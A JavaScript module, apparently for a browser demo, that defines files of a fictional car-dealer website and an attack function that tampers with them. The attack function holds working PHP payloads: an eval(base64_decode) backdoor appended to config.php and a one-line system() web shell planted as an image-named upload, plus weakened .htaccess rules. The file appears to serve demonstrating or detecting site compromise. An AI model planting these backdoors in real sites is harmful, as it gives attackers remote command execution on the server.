// A tiny fictional website used by the in-browser demo, plus the "attack" applied to it.
export const DEMO_FILES = {
  "index.html": `<!doctype html>
<html lang="en">
<head><title>Northgate Motors</title><link rel="stylesheet" href="css/site.css"></head>
<body><h1>Quality used cars</h1><a href="contact.php">Contact us</a></body>
</html>
`,
  "contact.php": `<?php
require 'config.php';
$name = htmlspecialchars($_POST['name'] ?? '');
mail(CONTACT_EMAIL, 'New enquiry', "From: $name");
`,
  "config.php": `<?php
define('DB_HOST', 'localhost');
define('DB_USER', 'site');
define('CONTACT_EMAIL', 'sales@example.com');
`,
  ".htaccess": `Options -Indexes
<Files "config.php">
  Require all denied
</Files>
`,
  "robots.txt": `User-agent: *
Disallow: /admin/
`,
  "css/site.css": `body { font-family: system-ui; margin: 2rem; }
h1 { color: #1d3fbf; }
`,
};

/** What an attacker who got in through an outdated plugin typically does. */
export const ATTACK = {
  description: "Backdoor added to config.php, web shell uploaded, .htaccess protection removed, robots.txt deleted.",
  apply(files) {
    const f = { ...files };
    f["config.php"] = files["config.php"] + `if (isset($_GET['x'])) { eval(base64_decode($_GET['x'])); }\n`;
    f["uploads/avatar.php"] = `<?php system($_REQUEST['cmd']); ?>\n`;
    f[".htaccess"] = "Options +Indexes\n";
    delete f["robots.txt"];
    return f;
  },
};
